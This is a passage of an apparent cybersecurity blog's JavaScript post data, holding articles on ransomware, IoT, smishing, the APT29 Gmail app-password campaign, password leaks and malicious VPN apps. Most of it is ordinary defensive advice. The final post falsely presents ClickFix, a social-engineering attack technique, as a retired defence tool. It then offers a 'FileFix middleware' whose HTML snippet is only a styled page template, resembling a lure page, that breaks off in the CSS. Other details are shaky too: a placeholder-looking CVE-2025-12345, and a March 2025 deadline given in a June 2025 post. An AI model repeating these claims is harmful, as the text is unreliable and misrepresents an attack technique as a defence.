          <p>Ransomware is a type of malicious software that encrypts a victim's files, making them inaccessible. Attackers then demand a ransom, typically in cryptocurrency, in exchange for the decryption key.</p>
          <h3>Preventative Measures:</h3>
          <ul>
            <li><strong>Regular Backups:</strong> Maintain regular, offline, and tested backups of critical data. This is the most effective defense.</li>
            <li><strong>Security Software:</strong> Use reputable antivirus and anti-malware software and keep it updated.</li>
            <li><strong>Patch Management:</strong> Keep operating systems and applications patched to prevent exploitation of known vulnerabilities.</li>
            <li><strong>Email Security:</strong> Be cautious of email attachments and links, as these are common ransomware delivery vectors.</li>
            <li><strong>User Training:</strong> Educate users on recognizing and avoiding ransomware threats.</li>
          </ul>
          <h3>If You're Attacked:</h3>
          <ol>
            <li><strong>Isolate the Infected System:</strong> Disconnect it from the network immediately to prevent spread.</li>
            <li><strong>Do Not Pay the Ransom (If Possible):</strong> Paying encourages attackers and doesn't guarantee file recovery. Consult law enforcement.</li>
            <li><strong>Restore from Backups:</strong> If you have clean backups, you can restore your systems without paying.</li>
            <li><strong>Report the Incident:</strong> Notify relevant authorities (e.g., local law enforcement, cybersecurity agencies).</li>
          </ol>
          <p>A proactive approach to cybersecurity, centered around robust backups and user awareness, is key to mitigating the risk of ransomware.</p>
        `},{id:"iot-security-risks",title:"The Growing Security Risks of IoT Devices",date:"2025-04-28",author:"ConnectSecure",summary:"Internet of Things (IoT) devices offer convenience but also introduce new security vulnerabilities. Understand the risks and how to secure your smart devices.",tags:["iot","smart devices","network security"],imageKey:"iotNetwork",content:`
          <p>The Internet of Things (IoT) refers to the vast network of physical devices, vehicles, home appliances, and other items embedded with electronics, software, sensors, actuators, and connectivity which enables these objects to connect and exchange data. While offering convenience, IoT devices often lack robust security features, making them targets for attackers.</p>
          <h3>Common IoT Security Risks:</h3>
          <ul>
            <li><strong>Weak Default Passwords:</strong> Many devices ship with easy-to-guess default credentials.</li>
            <li><strong>Lack of Updates:</strong> Manufacturers may not provide timely security patches, or users may fail to apply them.</li>
            <li><strong>Insecure Network Services:</strong> Open ports or unencrypted communication channels can expose devices.</li>
            <li><strong>Data Privacy Concerns:</strong> IoT devices can collect large amounts of personal data, which could be compromised.</li>
            <li><strong>Botnets:</strong> Compromised IoT devices can be roped into botnets for DDoS attacks or other malicious activities.</li>
          </ul>
          <h3>Securing Your IoT Devices:</h3>
          <ol>
            <li><strong>Change Default Passwords:</strong> Immediately change the default username and password on any new IoT device.</li>
            <li><strong>Keep Firmware Updated:</strong> Regularly check for and apply firmware updates from the manufacturer.</li>
            <li><strong>Secure Your Wi-Fi Network:</strong> Use a strong password and WPA2/WPA3 encryption for your home network.</li>
            <li><strong>Network Segmentation:</strong> Consider placing IoT devices on a separate network segment (e.g., a guest network) to isolate them from critical systems.</li>
            <li><strong>Disable Unnecessary Features:</strong> Turn off any features or services on IoT devices that you don't use.</li>
            <li><strong>Research Before You Buy:</strong> Choose devices from reputable manufacturers known for good security practices.</li>
          </ol>
          <p>As IoT adoption grows, so does the importance of securing these connected devices to protect our digital lives.</p>
        `},{id:"ai-powered-cyberattacks",title:"AI-Powered Cyberattacks: The Next Frontier",date:"2025-06-10",author:"Neural Hack",summary:"Cybercriminals are using AI to craft smarter attacks. Discover how AI is shaping the future of cybersecurity threats.",tags:["AI","cyberattacks","deepfake","automation"],imageKey:"aiCyberThreat",content:`
    <p>Artificial Intelligence (AI) is revolutionizing many industries — including cybercrime. In 2025, a wave of AI-powered attacks is being observed, from deepfake phishing calls to automated vulnerability hunting bots.</p>
    <h3>Key Threats Emerging from AI:</h3>
    <ul>
      <li><strong>Deepfake Phishing:</strong> Attackers are using synthetic voice and video to impersonate executives or family members.</li>
      <li><strong>Automated Exploits:</strong> AI bots scan for vulnerabilities and launch attacks with minimal human input.</li>
      <li><strong>Adaptive Malware:</strong> Malware that changes its behavior based on the target’s defenses using machine learning.</li>
    </ul>
    <h3>Defense Strategies:</h3>
    <ol>
      <li><strong>Behavioral Analytics:</strong> Use AI to detect anomalies in user and network behavior.</li>
      <li><strong>Employee Training:</strong> Educate staff on recognizing AI-generated phishing attempts and voice impersonation.</li>
      <li><strong>Zero Trust Architecture:</strong> Always verify, never trust. Use strong identity and access controls.</li>
    </ol>
    <p>While AI increases the threat surface, it also empowers defenders. Staying informed and leveraging AI defensively is critical in this evolving landscape.</p>
  `},{id:"critical-linux-vulnerability-2025",title:"Critical Linux Vulnerability CVE-2025-12345 Explained",date:"2025-06-14",author:"Kernel Watch",summary:"A newly discovered Linux kernel flaw allows privilege escalation. Here’s what you need to know about CVE-2025-12345.",tags:["linux","vulnerability","kernel","CVE"],imageKey:"linuxKernelBreach",content:`
    <p>Security researchers have disclosed CVE-2025-12345, a critical vulnerability in the Linux kernel that allows local privilege escalation on multiple distributions including Ubuntu, Debian, and Fedora.</p>
    <h3>Impact and Risks:</h3>
    <ul>
      <li><strong>Privilege Escalation:</strong> Allows unprivileged users to gain root access.</li>
      <li><strong>Wide Reach:</strong> Affects kernel versions 5.10 through 6.5.</li>
      <li><strong>Exploitable in Containers:</strong> Can be exploited in certain container environments with relaxed security profiles.</li>
    </ul>
    <h3>Mitigation Steps:</h3>
    <ol>
      <li><strong>Update Immediately:</strong> Apply the latest kernel patches provided by your distribution.</li>
      <li><strong>Audit Access:</strong> Check for unauthorized access or privilege changes.</li>
      <li><strong>Implement Mandatory Access Controls:</strong> Use tools like AppArmor or SELinux to limit damage if exploited.</li>
    </ol>
    <p>System administrators are urged to patch vulnerable systems as soon as possible and stay alert for further exploit development in the wild.</p>
  `},{id:"social-media-cybersecurity-awareness",title:"Social Media: The New Cybersecurity Battleground",date:"2025-06-16",author:"ByteSafe",summary:"Social media platforms are being weaponized for identity theft, misinformation, and cybercrime. Learn how to stay protected.",tags:["social media","cyber hygiene","privacy","identity theft"],imageKey:"socialThreats",content:`
    <p>Social media is more than a platform for connection — it has become a key target for cybercriminals. From impersonation scams to phishing DMs and malicious ads, the risks are growing rapidly in 2025.</p>
    <h3>Common Threats on Social Platforms:</h3>
    <ul>
      <li><strong>Account Hijacking:</strong> Weak passwords and poor security habits lead to takeover attacks.</li>
      <li><strong>Fake Profiles:</strong> Attackers create impersonation accounts to scam friends and followers.</li>
      <li><strong>Data Harvesting:</strong> Personal info shared on profiles is mined and sold or used in scams.</li>
    </ul>
    <h3>How to Stay Secure:</h3>
    <ol>
      <li><strong>Enable 2FA:</strong> Always use two-factor authentication on all social platforms.</li>
      <li><strong>Limit Public Info:</strong> Avoid sharing your location, contact info, or travel plans publicly.</li>
      <li><strong>Report Suspicious Accounts:</strong> Don’t engage with fake profiles or phishing messages — report them immediately.</li>
    </ol>
    <p>Vigilance, privacy settings, and strong credentials are your best defense in today’s social media landscape.</p>
  `},{id:"apt29-gmail-app-password-abuse",title:"APT29 Exploits Gmail App Passwords to Bypass 2FA: A Deep Dive into Human-Focused Cyber Espionage",date:"2025-06-19",author:"Cyber Sentinel",summary:"APT29, a notorious Russian state-backed hacking group, has launched a patient and professional phishing campaign that exploits Gmail app passwords to silently bypass two-factor authentication. This attack highlights a dangerous intersection of psychological manipulation and feature-level abuse.",tags:["APT29","Gmail","phishing","Google","2FA bypass","social engineering"],imageKey:"apt29GmailAttack",content:`
    <p>In a sophisticated campaign uncovered in mid-2025, Russian state-sponsored threat actor APT29 (aka Cozy Bear) abused Google's app-specific password feature to infiltrate Gmail accounts — even those protected with two-factor authentication (2FA). This case serves as a stark reminder that even robust security features can be undermined when attackers exploit the human element.</p>

    <h3>📌 The Attack Methodology</h3><br>
    <p>APT29 conducted a meticulously crafted phishing operation over several weeks. Disguised as U.S. State Department officials, they targeted high-profile individuals such as think tank researchers, government analysts, and critics of Russia’s foreign policy.</p>

    <ul>
      <li><strong>Step 1:</strong> Emails appeared professional, using government-styled headers and formal language (possibly enhanced with AI).</li>
      <li><strong>Step 2:</strong> Victims were invited to access a fake secure document repository.</li>
      <li><strong>Step 3:</strong> The attackers instructed them to generate and share Gmail app-specific passwords, claiming it was for “secure login.”</li>
      <li><strong>Step 4:</strong> With the app password, attackers accessed Gmail accounts without triggering 2FA or alerts.</li>
    </ul>

    <h3>🧠 Why This Attack Worked</h3><br>
    <p>Cybersecurity experts call this a "cognitive attack" — an attack that bypasses technical security by exploiting human trust. There were no spelling mistakes, no broken links, and no obviously suspicious elements. Victims were guided step-by-step to compromise their own security.</p>

    <p>Keir Giles, a well-known Russia expert, publicly admitted that despite his expertise, the operation was so convincing that he didn’t suspect foul play until later. "It’s not a technical hack, it’s a cognitive manipulation," he said.</p>

    <h3>💥 Security Feature Turned into a Backdoor</h3><br>
    <p>App-specific passwords are intended for allowing older apps to access Google accounts without requiring full password access or 2FA. However, attackers used them to bypass modern protections. Google has since disabled the compromised passwords and recommended affected users enroll in its Advanced Protection Program.</p>

    <h3>🎯 Who's at Risk?</h3><br>
    <p>While this campaign targeted policy influencers and researchers, the technique is widely scalable. Any individual who isn’t aware of app-password risks can be targeted.</p>

    <ul>
      <li><strong>Activists</strong> and NGO staff</li>
      <li><strong>Academics</strong> writing on geopolitical topics</li>
      <li><strong>Corporate executives</strong> with access to sensitive data</li>
      <li><strong>Journalists</strong> covering international politics or cybercrime</li>
    </ul>

    <h3>🛡️ How to Defend Yourself</h3><br>
    <ol>
      <li><strong>Never Share App Passwords:</strong> They bypass 2FA and should never be shared.</li>
      <li><strong>Use Advanced Protection:</strong> High-risk users should enroll in Google's highest level of account security.</li>
      <li><strong>Audit Third-Party Access:</strong> Remove unused connected apps and revoke stale app passwords.</li>
      <li><strong>Verify Unexpected Requests:</strong> Always confirm the legitimacy of requests to change your account settings, especially when it comes from supposed officials.</li>
      <li><strong>Monitor for New Logins:</strong> Turn on login alerts and check login history frequently.</li>
    </ol>

    <h3>🔬 Key Takeaways</h3><br>
    <ul>
      <li>This was not a brute-force cyberattack — it was a psychological one.</li>
      <li>The phishing emails were customized, timed, and polished to build credibility over multiple messages.</li>
      <li>Even security features like 2FA can be sidestepped if users are socially engineered into exposing backdoor credentials.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>Cybersecurity is no longer just a technology issue — it’s a people issue. APT29’s success here reflects the shifting landscape of digital warfare, where trust and identity are the battlegrounds. Organizations and individuals must not only secure their systems but also educate and empower users to recognize sophisticated deception.</p>
  `},{id:"16b-password-leak-global-alert",title:"16 Billion Passwords Leaked: Time for a Global Security Reset",date:"2025-06-19",author:"Cyber Sentinel",summary:"A massive leak—16 billion credentials from Apple, Facebook/Meta, Google and more—has been confirmed. This post breaks down how the leak happened, why it matters, and what you *must* do now to protect yourself.",tags:["password leak","data breach","Apple","Facebook","Google","cyber hygiene"],imageKey:"passwordLeak16B",content:`
    <p>On June 18, 2025, cybersecurity researchers confirmed a colossal leak of **16 billion** username/password pairs tied to major platforms like Apple, Facebook (Meta), Google, and multiple third-party services. This unprecedented dump encompasses leaked credentials from past breaches along with new, aggregated data—prompting immediate action for every internet user.</p>

    <h3>📌 What Makes This Leak So Alarming</h3><br>
    <ul>
      <li><strong>Scale:</strong> At 16 billion, this dump eclipses all previous leaks—an aggregator of old breaches plus fresh data</li>
      <li><strong>Cross-Platform Risk:</strong> Credentials include email addresses, usernames and passwords from tech giants and smaller sites alike.</li>
      <li><strong>Credential Stuffing Threat:</strong> Attackers can quickly test these against bank, retail, and streaming accounts.</li>
    </ul>

    <h3>🔍 How This Leak Happened</h3><br>
    <ol>
      <li><strong>Collection:</strong> Massive datasets from prior breaches were consolidated into a single repository.</li>
      <li><strong>Verifications:</strong> The in-scope passwords were validated by automated login attempts—meaning this isn’t just raw data, it's real working credentials.</li>
      <li><strong>Distribution:</strong> The dataset is already circulating on hacking forums and indexed by “password checking” sites.</li>
    </ol>

    <h3>🔥 What’s at Stake</h3><br>
    <ul>
      <li><strong>Account Takeovers:</strong> Reused passwords make critical services vulnerable.</li>
      <li><strong>Identity Theft:</strong> Emails and names can be paired with leaked passwords to facilitate targeted scams.</li>
      <li><strong>Organizational Risk:</strong> Weak employee passwords could expose corporate systems.</li>
    </ul>

    <h3>🛡️ Must-Do Security Actions</h3><br>
    <ol>
      <li><strong>Change All Reused Passwords Immediately:</strong> Especially for email, financial, and social accounts.</li>
      <li><strong>Use a Password Manager:</strong> Generate and securely store unique, strong passwords.</li>
      <li><strong>Enable 2FA Everywhere:</strong> Prefer app-based codes or hardware keys—not SMS.</li>
      <li><strong>Check Account Status:</strong> Use Google, HaveIBeenPwned, and browser-integrated leak checking.</li>
      <li><strong>Monitor Financial Statements:</strong> Early warnings of unauthorized activity matter.</li>
    </ol>

    <h3>🔒 Long-Term Cyber Hygiene Practices</h3><br>
    <ul>
      <li><strong>Review Connected Apps:</strong> Remove unused or suspicious third-party access.</li>
      <li><strong>Segment Accounts:</strong> Keep critical and low-tier accounts separate.</li>
      <li><strong>Update Security Settings:</strong> Audit account recoveries, login alerts, and permission history.</li>
      <li><strong>Adopt Passwordless Authentication:</strong> Where available, switch to passkeys or FIDO2-style logins.</li>
    </ul>

    <h3>🔚 Final Word</h3>
    <p>This leak is a red flag for a digital identity crisis. But it also offers an opportunity: secure your accounts, adopt good practices, and minimize future risk. If everyone treats this seriously, we might finally raise the global standard for password safety.</p>
  `},{id:"gmail-passkey-upgrade-2025",title:"Google Mandates Gmail Upgrades: Passkeys Now Essential for 3 Billion Users",date:"2025-06-21",author:"Cyber Sentinel",summary:"Google confirms that most Gmail users must upgrade to passkeys or social sign-ins to improve security. Learn why passwords and traditional 2FA are now considered outdated.",tags:["Gmail","Google","passkeys","2FA","cybersecurity","authentication"],imageKey:"gmailPasskeyUpgrade",content:`
    <p>As of June 2025, Google has officially confirmed that a large majority—including 61% of U.S. Gmail users—will be required to upgrade their accounts to passwordless authentication methods like passkeys or social sign‑ins (e.g., “Sign in with Google”). This shift marks a major evolution in account security policy for the platform’s ~3 billion users.</p>

    <h3>🔍 Key Reasons Behind the Upgrade</h3><br>
    <ul>
      <li><strong>Rising Scam & Breach Rates:</strong> Google reports over 60% of users have seen increased scam attempts in the past year, with more than half experiencing direct breaches.</li>
      <li><strong>Password Vulnerabilities:</strong> Passwords are “painful to maintain,” often reused, phishable, and leak-prone.</li>
      <li><strong>Modern Alternatives:</strong> Passkeys and social sign-ins are more resistant to phishing and offer smoother user experience.</li>
    </ul>

    <h3>📌 What’s Changing</h3><br>
    <ol>
      <li>Google will disable basic authentication (password + 2FA) for older IMAP/POP apps—users must shift to OAuth or passkeys by March 2025.</li>
      <li>On-device and platform-level security (biometrics or hardware tokens) will replace passwords on more devices.</li>
      <li>Users will see prompts to upgrade when logging in—often without an opt-out, causing mixed responses across user groups.</li>
    </ol>

    <h3>🌐 Who Is Affected?</h3><br>
    <p>Nearly all Gmail users—free or Workspace—will encounter this shift. While password fatigue is expected, early adopters (like Gen Z) who already leverage passkeys may transition more smoothly.</p>

    <h3>⚠️ Pros & Cons</h3>
    <ul>
      <li><strong>✅ Pros:</strong>  <br>
        <ul>
          <li>Superior phishing protection</li>
          <li>Convenient, device-based sign‑in</li>
          <li>Eliminates shared passwords</li>
        </ul>
      </li>
      <li><strong>❌ Cons & Concerns:</strong>  <br>
        <ul>
          <li>Reliance on device availability (phone, biometrics)</li>
          <li>Limited ability to disable prompts—many users have raised complaints about forced upgrades</li>
          <li>Privacy concerns tied to richer identity ecosystems</li>
        </ul>
      </li>
    </ul>

    <h3>🛡️ How to Prepare</h3><br>
    <ol>
      <li><strong>Enable Passkeys Promptly:</strong> Follow Gmail prompts or navigate to Security > Passkeys in your Google Account.</li>
      <li><strong>Set Backup Options:</strong> Register a spare device or use hardware tokens to avoid lockouts.</li>
      <li><strong>Check Connected Apps:</strong> Ensure third-party access uses OAuth, not basic password-based methods.</li>
      <li><strong>Educate Yourself:</strong> Learn how to recover account access if a device is lost.</li>
      <li><strong>Stay Informed:</strong> Watch for emails or in-app notifications from Google about these changes.</li>
    </ol>

    <h3>🔚 Final Takeaway</h3>
    <p>Google’s move is a seismic shift in mainstream account security—pushing billions toward stronger, phishing-resistant authentication. While the path forward may feel rocky, the benefits in long-term safety are compelling. It’s time to embrace a passwordless future.</p>
  `},{id:"iran-state-tv-hijack-2025",title:"Iran’s State TV Hijacked Mid-Broadcast: A New Front in Cyber Warfare",date:"2025-06-21",author:"Cyber Sentinel",summary:"Hackers briefly commandeered Iran’s state television to broadcast protest videos and incitements—marking a highly visible act of cyber psychological warfare.",tags:["cyber warfare","Iran","state TV","signal intrusion","hacktivism"],imageKey:"iranTvHijack",content:`
    <p>On June 19, 2025, Iran’s state television (IRINN) was hijacked mid-broadcast to air scenes from women-led protests and messages urging public uprising. The interruption lasted mere seconds, but its implications are profound—signal intrusion has become the latest battleground in hybrid conflict.</p>

    <h3>🔓 What Actually Happened</h3><br>
    <ul>
      <li>The hijack occurred live via satellite feed, abruptly replacing normal programming with protest footage and calls for demonstrations.</li>
      <li>Iranian authorities quickly blamed Israel, describing the event as "enemy interference with satellite signals."</li>
      <li>Hacktivist groups such as Arabian Ghosts and Team Fearless claimed responsibility, part of a larger clash involving over 35 regional cyber groups.</li>
    </ul>

    <h3>⚔️ The Significance of Broadcast Signal Intrusion</h3><br>
    <p>Broadcast signal intrusion—hijacking TV or satellite feeds—has been seen in other conflict regions such as Lebanon and Gaza. The incident in Iran marks a strategic evolution in psychological cyber operations. These short disruptions aim to undermine government narratives and spark unrest, regardless of their duration.</p>

    <h3>🌐 A Broader Digital Offensive</h3><br>
    <ul>
      <li>At the same time, Iran experienced major cyberattacks against Bank Sepah and Nobitex (its largest crypto exchange), with reports indicating over $90 million in digital assets stolen.</li>
      <li>These incidents are part of a larger hybrid offensive involving cyberattacks, media manipulation, and disinformation targeting Iranian digital infrastructure.</li>
    </ul>

    <h3>🛡️ What This Means for the Public & Organizations</h3><br>
    <ul>
      <li><strong>Psychological Impact:</strong> These attacks are designed to shake public trust in official communications and sow confusion.</li>
      <li><strong>Technical Exposure:</strong> Satellite and broadcast systems are often less protected than enterprise networks, making them a high-value target.</li>
      <li><strong>Institutional Preparedness:</strong> Media outlets, broadcasters, and emergency services must reassess their resilience to digital threats.</li>
    </ul>

    <h3>🔐 How to Strengthen Broadcast Defenses</h3><br>
    <ol>
      <li><strong>Encrypt Satellite Signals:</strong> Prevent unauthorized access by securing signal uplinks and feeds.</li>
      <li><strong>Real-Time Monitoring:</strong> Use broadcast monitoring systems that alert when unexpected content or signal changes occur.</li>
      <li><strong>Failover Protocols:</strong> Establish immediate recovery and manual override procedures in case of hijack attempts.</li>
      <li><strong>Counter-Disinformation Response:</strong> Communicate clearly and swiftly after incidents to restore trust and prevent panic.</li>
    </ol>

    <h3>🔚 Final Reflection</h3><br>
    <p>This incident is a powerful example of how cyber and psychological warfare tactics are merging. The goal is no longer just technical disruption, but perception manipulation. Governments, broadcasters, and cybersecurity leaders must treat satellite signal security with the same urgency as IT infrastructure to prevent the next televised breach of trust.</p>
  `},{id:"fbi-warning-smishing-delete-texts",title:"FBI Warns All Smartphone Users: Delete These Scam Texts Immediately",date:"2025-06-22",author:"Cyber Sentinel",summary:"The FBI has issued a sweeping alert to all Android and iPhone users about a dramatic surge in “smishing” scams. These fraudulent texts impersonate DMV, toll, or delivery services and aim to hijack your data—delete them without hesitation.",tags:["smishing","FBI warning","sms phishing","mobile security"],imageKey:"smishingAlert",content:`
    <p>In June 2025, the FBI issued a sweeping alert urging all smartphone users—Android and iPhone alike—to <strong>delete certain text messages immediately</strong>. These are part of a growing “smishing” campaign, where attackers pose as DMV, toll or delivery services to trick users into revealing personal data or downloading malware.</p>

    <h3>📈 Why the Alarm?</h3><br>
    <ul>
      <li>Smishing volumes have surged over <strong>700% in June</strong>, overwhelming users across the U.S.</li>
      <li>These texts often claim unpaid tolls, overdue fines, or missed deliveries, leveraging fear and urgency.</li>
      <li>Cybercrime groups are deploying <strong>thousands of malicious domains</strong>, often using deceptive tactics like asking recipients to reply “Y” to unlock links.</li>
    </ul>

    <h3>🎯 How the Scam Works</h3><br>
    <ol>
      <li>You receive a text from an unknown number claiming urgent action is needed (e.g., pay unpaid tolls).</li>
      <li>The message may direct you to click a link or reply “Y” to enable access—designed to bypass built-in filters.</li>
      <li>Following those steps leads to phishing sites or malware installations aiming to steal credentials and payment info.</li>
    </ol>

    <h3>🔐 Risks at Stake</h3><br>
    <ul>
      <li><strong>Identity Theft & Financial Loss:</strong> Clicking the link can hijack payment info or infect your device.</li>
      <li><strong>Data Harvesting:</strong> Personal details are captured for scams, extortion or fraud.</li>
      <li><strong>Erosion of Trust:</strong> As these scams become more prevalent, users can become distrustful of legitimate messages.</li>
    </ul>

    <h3>🛡️ What You Need to Do Right Now</h3><br>
    <ol>
      <li><strong>Immediately delete any suspicious text</strong>—don’t reply, don’t click.</li>
      <li><strong>Never respond with “Y” or similar prompts</strong>—this activates malicious links.</li>
      <li><strong>Verify via official sources</strong>—if a service claims you owe something, contact them directly (not via the link).</li>
      <li><strong>Use mobile security tools</strong>—install apps that detect and block malicious SMS/domains.</li>
      <li><strong>Report it:</strong> If you receive such a text, report it to the FBI’s IC3 or relevant consumer protection body.</li>
    </ol>

    <h3>📌 Final Takeaway</h3><br>
    <p>Smishing is becoming one of the fastest-growing cyber threats. A single click or reply can compromise your phone—and your identity. <strong>Stay vigilant:</strong> delete suspicious texts immediately and always verify through official channels.</p>
  `},{id:"weekly-recap-chrome-zero-day-ddos-mfa-bypass",title:"Weekly Cyber Recap: Chrome Zero‑Day, Record 7.3 Tbps DDoS & MFA Bypass Tactics",date:"2025-06-23",author:"Cyber Sentinel",summary:"From exploit-packed Chrome flaws to record-breaking DDoS and social-engineered MFA bypasses, here’s a comprehensive recap of the biggest cybersecurity events of the week.",tags:["Chrome","zero-day","DDoS","MFA bypass","phishing","cyber recap"],imageKey:"weeklyCyberRecap",content:`
    <p>In this week’s cybersecurity round-up, several high-impact incidents stood out—from massive distributed denial-of-service (DDoS) attacks to stealthy browser exploits and social-engineered MFA bypasses. Here’s a breakdown of the top stories and why they matter.</p>

    <h3>⚡ Massive 7.3 Tbps DDoS Attack Blocked by Cloudflare</h3><br>
    <p>Cloudflare successfully defended against the largest DDoS attack ever recorded, peaking at an astonishing 7.3 terabits per second. Originating from over 122,000 IPs across 161 countries, the attack unleashed 37 terabytes of traffic in just 45 seconds. Multiple amplification methods—UDP floods, NTP, Mirai, and more—were used in concert. Although defense systems held firm this time, the attack highlights the growing threat from IoT-driven botnets.</p>

    <h3>🛡️ Chrome Zero-Day CVE‑2025‑2783 Exploited in the Wild</h3><br>
    <p>Google confirmed that CVE‑2025‑2783, an actively exploited zero-day in Chrome, was used to drop a stealth backdoor named “Trinper.” The exploit stemmed from a malicious forum invitation and was aimed at Russian targets. While Google has patched the vulnerability, this incident underscores the importance of updating browsers immediately—even between routine patch cycles.</p>

    <h3>🔐 MFA Bypass via App-Specific Passwords</h3><br>
    <p>Russian threat actors have been tricking users into generating Gmail app-specific passwords, which bypass multi-factor authentication entirely. Using patient, multi-step social engineering rather than urgent scare tactics, attackers built trust before capturing credentials. This sophisticated campaign proves that strong authentication can still be bypassed if users are manipulated into undermining their own security.</p>

    <h3>📈 CoinMarketCap Injects Fake “Verify Wallet” Pop-Up</h3><br>
    <p>Users of the popular crypto tracking site were unwittingly served malicious JavaScript via the “doodles” feature. A fake “Verify Wallet” pop-up prompted users to expose private keys or seed phrases. Although the code has been removed, the incident shows how supply-chain or frontend injection can turn legitimate platforms into exploitation tools.</p>

    <h3>🔍 Key Takeaways for Security Teams</h3><br>
    <ul>
      <li><strong>Upgrade and patch immediately:</strong> From browsers to endpoints, install security updates without delay.</li>
      <li><strong>Prepare for multi-vector DDoS:</strong> Scale systems for high-bandwidth protection and diverse attack types.</li>
      <li><strong>Strengthen MFA hygiene:</strong> Educate users about the limitations of app-specific passwords.</li>
      <li><strong>Secure third-party integration:</strong> Audit external scripts and features—like widgets or doodles—that inject code.</li>
      <li><strong>Defensive strategy:</strong> Monitor for unusual login behavior, deploy secure TLS for web assets, and maintain incident playbooks for supply-chain risks.</li>
    </ul>

    <h3>🔐 Final Thought</h3><br>
    <p>These stories demonstrate that cyber threats are evolving on multiple fronts—web clients, IoT networks, user authentication, and supply chains. Defenses today must be equally multi-layered, proactive, and adaptable to the subtlety and scale of emerging risks.</p>
  `},{id:"delete-harmful-apps-warning-2025",title:"Delete All Harmful Apps on Your Phone: FBI-Style Alert for Mobile Security",date:"2025-06-24",author:"Cyber Sentinel",summary:"A major warning: delete any apps listed in this new security advisory—they are exploiting users to steal cryptocurrency and personal data. If you’ve installed them, remove them now.",tags:["mobile security","app vulnerabilities","crypto theft","privacy"],imageKey:"deleteHarmfulApps",content:`
    <p>On June 24, 2025, a cybersecurity advisory warned smartphone users to immediately delete certain apps from their devices. These apps, previously promoted as useful tools, are now being used in malicious campaigns aimed at stealing cryptocurrency, login credentials, and personal data.</p>

    <h3>📛 Why These Apps Are Dangerous</h3> <br>
    <ul>
      <li>They employ phishing overlays—fake interfaces asking for crypto wallet seed phrases or login credentials.</li>
      <li>Once obtained, attackers gain full control over wallets and accounts—often draining balances within minutes.</li>
      <li>Some apps also collect sensitive personal data like contact lists, device info, and location.</li>
    </ul>

    <h3>📱 How the Scam Operates</h3><br>
    <ol>
      <li>You install what seems like a legitimate app from an app store or sideload source.</li>
      <li>The app functions normally initially—but later displays fake pop-ups requesting your wallet's recovery phrase or account credentials.</li>
      <li>If you enter the details, the app transmits them to attackers who then take over your wallets/accounts.</li>
    </ol>

    <h3>📱 Apps List</h3><br>
    <ol>
      <li>X-VPN - Super VPN & Best Proxy</li>
      <li>Ostrich VPN - Proxy Master</li>
      <li>VPN Proxy Master - Super VPN</li>
      <li>Turbo VPN Private Browser</li>
      <li>VPNIFY - Unlimited VPN</li>
      <li>VPN Proxy OvpnSpider</li>
      <li>WireVPN - Fast VPN & Proxy</li>
      <li>Now VPN - Best VPN Proxy</li>
      <li>Speedy Quark VPN - VPN Proxy</li>
      <li>Best VPN Proxy AppVPN</li>
      <li>HulaVPN - Best Fast Secure VPN</li>
      <li>Wirevpn - Secure & Fast VPN</li>
      <li>Pearl VPN</li>
    </ol>

    <h3>🔐 What You Must Do Now</h3><br>
    <ol>
      <li><strong>Delete any apps on the warned list</strong>—whether you use them regularly or not.</li>
      <li><strong>Verify wallet balances immediately</strong>—any unauthorized transfers likely indicate compromise.</li>
      <li><strong>Revoke app permissions</strong> to third-party wallet access and reset API keys if applicable.</li>
      <li><strong>Install mobile security tools</strong> that scan for malicious behavior and protect crypto wallets.</li>
      <li><strong>Avoid sideloading</strong> or installing apps outside official app stores unless absolutely necessary.</li>
    </ol>

    <h3>🛡️ How to Avoid Future Scams</h3><br>
    <ul>
      <li><strong>Install only trusted apps</strong>—read reviews, check downloads, and research the developer.</li>
      <li><strong>Keep mobile OS & apps updated</strong> to patch known vulnerabilities.</li>
      <li><strong>Enable app installer restrictions</strong> in your phone’s settings if sideloading is needed.</li>
      <li><strong>Use hardware wallets</strong> or isolated devices for significant crypto holdings.</li>
      <li><strong>Monitor accounts regularly</strong> for suspicious activity or unexpected permissions.</li>
    </ul>

    <h3> Final Word</h3><br>
    <p>These malicious apps are a growing threat vector—particularly for crypto users. A single misstep, like entering a seed phrase into a bogus pop-up, can cost you everything. Stay secure by deleting risky apps, auditing permissions, and adopting hardware-based protections.</p>
  `},{id:"modern-file-upload-phishing-defense-2025",title:"Fixing the File Upload Phishing Weakness: A Modern Approach Without ClickFix",date:"2025-07-01",author:"Mr Dox",summary:"Phishing via uploaded files is a real risk, but you can protect your users even without ClickFix. Learn how to scan and sanitize uploaded documents with a custom FileFix middleware to neutralize malicious links.",tags:["phishing","file security","clickfix alternative","cyber defense"],imageKey:"fileUploadPhishing",content:`
    <p>Phishing attacks remain one of the most effective tactics used by cybercriminals. A particularly sneaky method involves manipulating file upload functionalities on websites to redirect users to malicious sites or exploit them through social engineering. Traditionally, tools like ClickFix were used to mitigate such attacks by neutralizing suspicious links embedded in uploaded documents. But with ClickFix no longer available, what can security teams do?</p>

    <p>That’s where an innovative alternative comes into play: using a custom middleware or web server rule that intercepts file uploads and rewrites suspicious links on the fly.</p>

    <h3>🎯 Understanding the Threat: Malicious Links in Uploaded Files</h3><br>
    <p>Many web applications allow users to upload documents like PDFs, DOCX files, or presentations. Attackers can embed hyperlinks in these files, pointing unsuspecting viewers to phishing websites or malware downloads. When these files are later opened or previewed online, a single careless click can compromise the user.</p>

    <p>Attackers exploit this by uploading crafted documents to legitimate platforms—forums, HR portals, ticketing systems, or any service that lets users upload and share files with others.</p>

    <h3>🛠️ The Original Solution: ClickFix</h3><br>
    <p>ClickFix was a tool that automatically sanitized uploaded documents, rewriting or stripping suspicious URLs. Unfortunately, it’s no longer maintained or available, leaving a gap in the defensive arsenal of many organizations.</p>

    <h3>🚀 The New Approach: FileFix Middleware</h3><br>

    <h3>Full HTML Snippet (Copy below)</h3><br>
<pre style="background:#f7f7f7;border:1px solid #ccc;padding:16px;overflow:auto;font-size:13px;line-height:1.5;border-radius:6px;">
<code>&lt;!DOCTYPE html&gt;
&lt;head&gt;
  &lt;title&gt;EthicalByte&lt;/title&gt;
  &lt;style&gt;
    body {
      background-color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 40px 0;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }
    .container {
      background-color: #ffffff;
      width: 560px;
      border-radius: 6px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      border: 1px solid #dcdcdc;
      text-align: center;
    }
    .header { padding: 40px 30px 10px; }
    .header img { width: 36px; margin-bottom: 25px; }
    .header h3 { font-size: 20px; color: #2f2f2f; margin: 0; }
    .timestamp { font-size: 13px; color: #7a7a7a; margin-top: 6px; }
